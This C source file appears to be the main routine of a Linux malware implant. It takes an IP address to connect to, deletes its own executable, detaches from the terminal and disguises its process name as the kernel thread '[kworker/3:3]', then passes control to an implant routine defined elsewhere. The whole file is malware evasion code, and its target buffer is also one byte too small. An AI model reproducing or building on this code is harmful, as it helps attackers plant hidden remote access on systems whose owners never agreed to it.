#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include "../include/implant.h"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Error: Specify the IP address to connect to as an argument\n");
        return 1;
    }

    char target[strlen(argv[1])];
    strcpy(target, argv[1]);

    // remove implant upon execution
    unlink(argv[0]);

    // detach from tty to impersonate a daemon
    ioctl(0, TIOCNOTTY);

    // save the arg for later
    strncpy(target, argv[1], strlen(argv[1]) + 1);

    // process masquerading, change the command name associated with the proces (/proc/<pid>/comm)
    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
    strncpy(argv[0], "[kworker/3:3]", strlen(argv[0]) + 1);
    strncpy(argv[1], "\0", strlen(argv[1]));

    implant_init_n_call(target);

    return 0;
}